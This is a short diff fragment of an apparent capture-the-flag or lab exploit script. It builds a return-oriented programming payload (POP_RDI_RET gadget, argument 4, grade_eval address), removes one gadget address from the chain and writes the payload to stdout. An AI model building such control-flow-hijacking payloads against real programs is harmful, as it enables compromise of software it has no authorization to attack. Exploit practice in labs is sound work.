@@ -18,7 +18,6 @@ payload = (
     + p64(POP_RDI_RET)
     + p64(4)
     + p64(grade_eval)
-    + p64(0x4019B4)
 )
 
 sys.stdout.buffer.write(payload)
